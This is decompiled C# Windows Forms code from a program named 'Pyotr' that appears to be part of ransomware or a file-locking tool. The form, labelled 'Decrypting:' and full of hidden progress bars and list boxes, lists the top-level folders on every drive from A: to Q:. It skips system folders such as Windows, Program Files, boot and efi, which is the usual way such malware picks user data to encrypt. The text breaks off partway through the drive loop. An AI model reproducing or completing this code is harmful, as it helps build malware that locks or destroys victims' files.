using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Pyotr.My;

namespace Pyotr;

[DesignerGenerated]
public class Form3 : Form
{
	private IContainer components;

	private string filenamez;

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar5")]
	internal virtual ProgressBar ProgressBar5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar4")]
	internal virtual ProgressBar ProgressBar4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer7
	{
		[CompilerGenerated]
		get
		{
			return _Timer7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer7_Tick;
			Timer timer = _Timer7;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer7 = value;
			timer = _Timer7;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("ProgressBar9")]
	internal virtual ProgressBar ProgressBar9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar7")]
	internal virtual ProgressBar ProgressBar7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar6")]
	internal virtual ProgressBar ProgressBar6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar3")]
	internal virtual ProgressBar ProgressBar3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer8
	{
		[CompilerGenerated]
		get
		{
			return _Timer8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer8_Tick;
			Timer timer = _Timer8;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer8 = value;
			timer = _Timer8;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer6
	{
		[CompilerGenerated]
		get
		{
			return _Timer6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer6_Tick;
			Timer timer = _Timer6;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer6 = value;
			timer = _Timer6;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("ProgressBar2")]
	internal virtual ProgressBar ProgressBar2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar1")]
	internal virtual ProgressBar ProgressBar1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ListBox9")]
	internal virtual ListBox ListBox9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ListBox8")]
	internal virtual ListBox ListBox8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ListBox7")]
	internal virtual ListBox ListBox7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer4
	{
		[CompilerGenerated]
		get
		{
			return _Timer4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer4_Tick;
			Timer timer = _Timer4;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer4 = value;
			timer = _Timer4;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("ListBox6")]
	internal virtual ListBox ListBox6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ListBox5")]
	internal virtual ListBox ListBox5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ListBox4")]
	internal virtual ListBox ListBox4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ListBox3")]
	internal virtual ListBox ListBox3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ListBox2")]
	internal virtual ListBox ListBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ListBox1")]
	internal virtual ListBox ListBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer3
	{
		[CompilerGenerated]
		get
		{
			return _Timer3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer3_Tick;
			Timer timer = _Timer3;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer3 = value;
			timer = _Timer3;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer5
	{
		[CompilerGenerated]
		get
		{
			return _Timer5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer5_Tick;
			Timer timer = _Timer5;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer5 = value;
			timer = _Timer5;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		[CompilerGenerated]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			Timer timer = _Timer2;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			timer = _Timer2;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	public Form3()
	{
		((Form)this).add_Load((EventHandler)Form3_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Expected O, but got Unknown
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b2: Expected O, but got Unknown
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Expected O, but got Unknown
		//IL_00be: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c8: Expected O, but got Unknown
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d3: Expected O, but got Unknown
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00de: Expected O, but got Unknown
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e9: Expected O, but got Unknown
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fa: Expected O, but got Unknown
		//IL_00fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0105: Expected O, but got Unknown
		//IL_0106: Unknown result type (might be due to invalid IL or missing references)
		//IL_0110: Expected O, but got Unknown
		//IL_0111: Unknown result type (might be due to invalid IL or missing references)
		//IL_011b: Expected O, but got Unknown
		//IL_011c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0126: Expected O, but got Unknown
		//IL_0127: Unknown result type (might be due to invalid IL or missing references)
		//IL_0131: Expected O, but got Unknown
		//IL_0132: Unknown result type (might be due to invalid IL or missing references)
		//IL_013c: Expected O, but got Unknown
		//IL_0143: Unknown result type (might be due to invalid IL or missing references)
		//IL_014d: Expected O, but got Unknown
		//IL_0154: Unknown result type (might be due to invalid IL or missing references)
		//IL_015e: Expected O, but got Unknown
		//IL_0165: Unknown result type (might be due to invalid IL or missing references)
		//IL_016f: Expected O, but got Unknown
		components = new Container();
		Label3 = new Label();
		Label2 = new Label();
		Label1 = new Label();
		ProgressBar5 = new ProgressBar();
		ProgressBar4 = new ProgressBar();
		Timer7 = new Timer(components);
		ProgressBar9 = new ProgressBar();
		ProgressBar7 = new ProgressBar();
		ProgressBar6 = new ProgressBar();
		ProgressBar3 = new ProgressBar();
		Timer8 = new Timer(components);
		Timer6 = new Timer(components);
		Timer1 = new Timer(components);
		ProgressBar2 = new ProgressBar();
		ProgressBar1 = new ProgressBar();
		ListBox9 = new ListBox();
		ListBox8 = new ListBox();
		ListBox7 = new ListBox();
		Timer4 = new Timer(components);
		ListBox6 = new ListBox();
		ListBox5 = new ListBox();
		ListBox4 = new ListBox();
		ListBox3 = new ListBox();
		ListBox2 = new ListBox();
		ListBox1 = new ListBox();
		Timer3 = new Timer(components);
		Timer5 = new Timer(components);
		Timer2 = new Timer(components);
		((Control)this).SuspendLayout();
		Label3.set_AutoSize(true);
		((Control)Label3).set_Location(new Point(86, 4));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(0, 13));
		((Control)Label3).set_TabIndex(60);
		Label2.set_AutoSize(true);
		((Control)Label2).set_Location(new Point(3, 4));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(63, 13));
		((Control)Label2).set_TabIndex(59);
		Label2.set_Text("Decrypting:");
		Label1.set_AutoSize(true);
		((Control)Label1).set_Location(new Point(-149, -79));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(0, 13));
		((Control)Label1).set_TabIndex(58);
		((Control)Label1).set_Visible(false);
		((Control)ProgressBar5).set_Location(new Point(-155, 207));
		((Control)ProgressBar5).set_Name("ProgressBar5");
		((Control)ProgressBar5).set_Size(new Size(100, 23));
		((Control)ProgressBar5).set_TabIndex(54);
		((Control)ProgressBar5).set_Visible(false);
		((Control)ProgressBar4).set_Location(new Point(320, 49));
		((Control)ProgressBar4).set_Name("ProgressBar4");
		((Control)ProgressBar4).set_Size(new Size(100, 23));
		((Control)ProgressBar4).set_TabIndex(53);
		((Control)ProgressBar4).set_Visible(false);
		((Control)ProgressBar9).set_ForeColor(Color.Green);
		((Control)ProgressBar9).set_Location(new Point(6, 20));
		((Control)ProgressBar9).set_Name("ProgressBar9");
		((Control)ProgressBar9).set_Size(new Size(414, 23));
		((Control)ProgressBar9).set_TabIndex(57);
		((Control)ProgressBar7).set_Location(new Point(160, 218));
		((Control)ProgressBar7).set_Name("ProgressBar7");
		((Control)ProgressBar7).set_Size(new Size(100, 23));
		((Control)ProgressBar7).set_TabIndex(56);
		((Control)ProgressBar7).set_Visible(false);
		((Control)ProgressBar6).set_Location(new Point(6, 218));
		((Control)ProgressBar6).set_Name("ProgressBar6");
		((Control)ProgressBar6).set_Size(new Size(100, 23));
		((Control)ProgressBar6).set_TabIndex(55);
		((Control)ProgressBar6).set_Visible(false);
		((Control)ProgressBar3).set_Location(new Point(160, 49));
		((Control)ProgressBar3).set_Name("ProgressBar3");
		((Control)ProgressBar3).set_Size(new Size(100, 23));
		((Control)ProgressBar3).set_TabIndex(52);
		((Control)ProgressBar3).set_Visible(false);
		((Control)ProgressBar2).set_Location(new Point(6, 39));
		((Control)ProgressBar2).set_Name("ProgressBar2");
		((Control)ProgressBar2).set_Size(new Size(100, 23));
		((Control)ProgressBar2).set_TabIndex(51);
		((Control)ProgressBar2).set_Visible(false);
		((Control)ProgressBar1).set_Location(new Point(-155, 39));
		((Control)ProgressBar1).set_Name("ProgressBar1");
		((Control)ProgressBar1).set_Size(new Size(100, 23));
		((Control)ProgressBar1).set_TabIndex(50);
		((Control)ProgressBar1).set_Visible(false);
		((ListControl)ListBox9).set_FormattingEnabled(true);
		((Control)ListBox9).set_Location(new Point(-155, 245));
		((Control)ListBox9).set_Name("ListBox9");
		((Control)ListBox9).set_Size(new Size(120, 95));
		((Control)ListBox9).set_TabIndex(49);
		((Control)ListBox9).set_Visible(false);
		((ListControl)ListBox8).set_FormattingEnabled(true);
		((Control)ListBox8).set_Location(new Point(320, 106));
		((Control)ListBox8).set_Name("ListBox8");
		((Control)ListBox8).set_Size(new Size(120, 95));
		((Control)ListBox8).set_TabIndex(48);
		((Control)ListBox8).set_Visible(false);
		((ListControl)ListBox7).set_FormattingEnabled(true);
		((Control)ListBox7).set_Location(new Point(160, 106));
		((Control)ListBox7).set_Name("ListBox7");
		((Control)ListBox7).set_Size(new Size(120, 95));
		((Control)ListBox7).set_TabIndex(47);
		((Control)ListBox7).set_Visible(false);
		((ListControl)ListBox6).set_FormattingEnabled(true);
		((Control)ListBox6).set_Location(new Point(6, 106));
		((Control)ListBox6).set_Name("ListBox6");
		((Control)ListBox6).set_Size(new Size(120, 95));
		((Control)ListBox6).set_TabIndex(46);
		((Control)ListBox6).set_Visible(false);
		((ListControl)ListBox5).set_FormattingEnabled(true);
		((Control)ListBox5).set_Location(new Point(-155, 106));
		((Control)ListBox5).set_Name("ListBox5");
		((Control)ListBox5).set_Size(new Size(120, 95));
		((Control)ListBox5).set_TabIndex(45);
		((Control)ListBox5).set_Visible(false);
		((ListControl)ListBox4).set_FormattingEnabled(true);
		((Control)ListBox4).set_Location(new Point(320, -62));
		((Control)ListBox4).set_Name("ListBox4");
		((Control)ListBox4).set_Size(new Size(120, 95));
		((Control)ListBox4).set_TabIndex(44);
		((Control)ListBox4).set_Visible(false);
		((ListControl)ListBox3).set_FormattingEnabled(true);
		((Control)ListBox3).set_Location(new Point(160, -62));
		((Control)ListBox3).set_Name("ListBox3");
		((Control)ListBox3).set_Size(new Size(120, 95));
		((Control)ListBox3).set_TabIndex(43);
		((Control)ListBox3).set_Visible(false);
		((ListControl)ListBox2).set_FormattingEnabled(true);
		((Control)ListBox2).set_Location(new Point(6, -62));
		((Control)ListBox2).set_Name("ListBox2");
		((Control)ListBox2).set_Size(new Size(120, 95));
		((Control)ListBox2).set_TabIndex(42);
		((Control)ListBox2).set_Visible(false);
		((ListControl)ListBox1).set_FormattingEnabled(true);
		((Control)ListBox1).set_Location(new Point(-155, -62));
		((Control)ListBox1).set_Name("ListBox1");
		((Control)ListBox1).set_Size(new Size(120, 95));
		((Control)ListBox1).set_TabIndex(41);
		((Control)ListBox1).set_Visible(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(431, 63));
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar5);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar4);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar9);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar7);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar6);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar3);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar2);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)ListBox9);
		((Control)this).get_Controls().Add((Control)(object)ListBox8);
		((Control)this).get_Controls().Add((Control)(object)ListBox7);
		((Control)this).get_Controls().Add((Control)(object)ListBox6);
		((Control)this).get_Controls().Add((Control)(object)ListBox5);
		((Control)this).get_Controls().Add((Control)(object)ListBox4);
		((Control)this).get_Controls().Add((Control)(object)ListBox3);
		((Control)this).get_Controls().Add((Control)(object)ListBox2);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Control)this).set_ForeColor(Color.FromArgb(0, 192, 0));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form3");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form3_Load(object sender, EventArgs e)
	{
		try
		{
			foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("A:\\"))
			{
				if (!directory.EndsWith("Bin") && !directory.EndsWith("indows") && !directory.EndsWith("tings") && !directory.EndsWith("System Volume Information") && !directory.EndsWith("cache") && !directory.EndsWith("very") && !directory.EndsWith("rogram Files (x86)") && !directory.EndsWith("rogram Files") && !directory.EndsWith("boot") && !directory.EndsWith("efi") && !directory.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory);
					ListBox9.get_Items().Add((object)directory);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("B:\\"))
			{
				if (!directory2.EndsWith("Bin") && !directory2.EndsWith("indows") && !directory2.EndsWith("tings") && !directory2.EndsWith("System Volume Information") && !directory2.EndsWith("cache") && !directory2.EndsWith("very") && !directory2.EndsWith("rogram Files (x86)") && !directory2.EndsWith("rogram Files") && !directory2.EndsWith("boot") && !directory2.EndsWith("efi") && !directory2.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory2);
					ListBox9.get_Items().Add((object)directory2);
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory3 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("C:\\"))
			{
				if (!directory3.EndsWith("Bin") && !directory3.EndsWith("indows") && !directory3.EndsWith("tings") && !directory3.EndsWith("System Volume Information") && !directory3.EndsWith("cache") && !directory3.EndsWith("very") && !directory3.EndsWith("rogram Files (x86)") && !directory3.EndsWith("rogram Files") && !directory3.EndsWith("boot") && !directory3.EndsWith("efi") && !directory3.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory3);
					ListBox9.get_Items().Add((object)directory3);
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory4 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("D:\\"))
			{
				if (!directory4.EndsWith("Bin") && !directory4.EndsWith("indows") && !directory4.EndsWith("tings") && !directory4.EndsWith("System Volume Information") && !directory4.EndsWith("cache") && !directory4.EndsWith("very") && !directory4.EndsWith("rogram Files (x86)") && !directory4.EndsWith("rogram Files") && !directory4.EndsWith("boot") && !directory4.EndsWith("efi") && !directory4.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory4);
					ListBox9.get_Items().Add((object)directory4);
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory5 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("E:\\"))
			{
				if (!directory5.EndsWith("Bin") && !directory5.EndsWith("indows") && !directory5.EndsWith("tings") && !directory5.EndsWith("System Volume Information") && !directory5.EndsWith("cache") && !directory5.EndsWith("very") && !directory5.EndsWith("rogram Files (x86)") && !directory5.EndsWith("rogram Files") && !directory5.EndsWith("boot") && !directory5.EndsWith("efi") && !directory5.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory5);
					ListBox9.get_Items().Add((object)directory5);
				}
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory6 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("F:\\"))
			{
				if (!directory6.EndsWith("Bin") && !directory6.EndsWith("indows") && !directory6.EndsWith("tings") && !directory6.EndsWith("System Volume Information") && !directory6.EndsWith("cache") && !directory6.EndsWith("very") && !directory6.EndsWith("rogram Files (x86)") && !directory6.EndsWith("rogram Files") && !directory6.EndsWith("boot") && !directory6.EndsWith("efi") && !directory6.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory6);
					ListBox9.get_Items().Add((object)directory6);
				}
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory7 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("G:\\"))
			{
				if (!directory7.EndsWith("Bin") && !directory7.EndsWith("indows") && !directory7.EndsWith("tings") && !directory7.EndsWith("System Volume Information") && !directory7.EndsWith("cache") && !directory7.EndsWith("very") && !directory7.EndsWith("rogram Files (x86)") && !directory7.EndsWith("rogram Files") && !directory7.EndsWith("boot") && !directory7.EndsWith("efi") && !directory7.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory7);
					ListBox9.get_Items().Add((object)directory7);
				}
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory8 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("H:\\"))
			{
				if (!directory8.EndsWith("Bin") && !directory8.EndsWith("indows") && !directory8.EndsWith("tings") && !directory8.EndsWith("System Volume Information") && !directory8.EndsWith("cache") && !directory8.EndsWith("very") && !directory8.EndsWith("rogram Files (x86)") && !directory8.EndsWith("rogram Files") && !directory8.EndsWith("boot") && !directory8.EndsWith("efi") && !directory8.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory8);
					ListBox9.get_Items().Add((object)directory8);
				}
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory9 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("I:\\"))
			{
				if (!directory9.EndsWith("Bin") && !directory9.EndsWith("indows") && !directory9.EndsWith("tings") && !directory9.EndsWith("System Volume Information") && !directory9.EndsWith("cache") && !directory9.EndsWith("very") && !directory9.EndsWith("rogram Files (x86)") && !directory9.EndsWith("rogram Files") && !directory9.EndsWith("boot") && !directory9.EndsWith("efi") && !directory9.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory9);
					ListBox9.get_Items().Add((object)directory9);
				}
			}
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory10 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("J:\\"))
			{
				if (!directory10.EndsWith("Bin") && !directory10.EndsWith("indows") && !directory10.EndsWith("tings") && !directory10.EndsWith("System Volume Information") && !directory10.EndsWith("cache") && !directory10.EndsWith("very") && !directory10.EndsWith("rogram Files (x86)") && !directory10.EndsWith("rogram Files") && !directory10.EndsWith("boot") && !directory10.EndsWith("efi") && !directory10.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory10);
					ListBox9.get_Items().Add((object)directory10);
				}
			}
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory11 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("K:\\"))
			{
				if (!directory11.EndsWith("Bin") && !directory11.EndsWith("indows") && !directory11.EndsWith("tings") && !directory11.EndsWith("System Volume Information") && !directory11.EndsWith("cache") && !directory11.EndsWith("very") && !directory11.EndsWith("rogram Files (x86)") && !directory11.EndsWith("rogram Files") && !directory11.EndsWith("boot") && !directory11.EndsWith("efi") && !directory11.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory11);
					ListBox9.get_Items().Add((object)directory11);
				}
			}
		}
		catch (Exception projectError11)
		{
			ProjectData.SetProjectError(projectError11);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory12 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("L:\\"))
			{
				if (!directory12.EndsWith("Bin") && !directory12.EndsWith("indows") && !directory12.EndsWith("tings") && !directory12.EndsWith("System Volume Information") && !directory12.EndsWith("cache") && !directory12.EndsWith("very") && !directory12.EndsWith("rogram Files (x86)") && !directory12.EndsWith("rogram Files") && !directory12.EndsWith("boot") && !directory12.EndsWith("efi") && !directory12.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory12);
					ListBox9.get_Items().Add((object)directory12);
				}
			}
		}
		catch (Exception projectError12)
		{
			ProjectData.SetProjectError(projectError12);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory13 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("M:\\"))
			{
				if (!directory13.EndsWith("Bin") && !directory13.EndsWith("indows") && !directory13.EndsWith("tings") && !directory13.EndsWith("System Volume Information") && !directory13.EndsWith("cache") && !directory13.EndsWith("very") && !directory13.EndsWith("rogram Files (x86)") && !directory13.EndsWith("rogram Files") && !directory13.EndsWith("boot") && !directory13.EndsWith("efi") && !directory13.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory13);
					ListBox9.get_Items().Add((object)directory13);
				}
			}
		}
		catch (Exception projectError13)
		{
			ProjectData.SetProjectError(projectError13);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory14 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("N:\\"))
			{
				if (!directory14.EndsWith("Bin") && !directory14.EndsWith("indows") && !directory14.EndsWith("tings") && !directory14.EndsWith("System Volume Information") && !directory14.EndsWith("cache") && !directory14.EndsWith("very") && !directory14.EndsWith("rogram Files (x86)") && !directory14.EndsWith("rogram Files") && !directory14.EndsWith("boot") && !directory14.EndsWith("efi") && !directory14.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory14);
					ListBox9.get_Items().Add((object)directory14);
				}
			}
		}
		catch (Exception projectError14)
		{
			ProjectData.SetProjectError(projectError14);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory15 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("O:\\"))
			{
				if (!directory15.EndsWith("Bin") && !directory15.EndsWith("indows") && !directory15.EndsWith("tings") && !directory15.EndsWith("System Volume Information") && !directory15.EndsWith("cache") && !directory15.EndsWith("very") && !directory15.EndsWith("rogram Files (x86)") && !directory15.EndsWith("rogram Files") && !directory15.EndsWith("boot") && !directory15.EndsWith("efi") && !directory15.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory15);
					ListBox9.get_Items().Add((object)directory15);
				}
			}
		}
		catch (Exception projectError15)
		{
			ProjectData.SetProjectError(projectError15);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory16 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("P:\\"))
			{
				if (!directory16.EndsWith("Bin") && !directory16.EndsWith("indows") && !directory16.EndsWith("tings") && !directory16.EndsWith("System Volume Information") && !directory16.EndsWith("cache") && !directory16.EndsWith("very") && !directory16.EndsWith("rogram Files (x86)") && !directory16.EndsWith("rogram Files") && !directory16.EndsWith("boot") && !directory16.EndsWith("efi") && !directory16.EndsWith(".old"))
				{
					ListBox1.get_Items().Add((object)directory16);
					ListBox9.get_Items().Add((object)directory16);
				}
			}
		}
		catch (Exception projectError16)
		{
			ProjectData.SetProjectError(projectError16);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string directory17 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories("Q:\\"))
			{
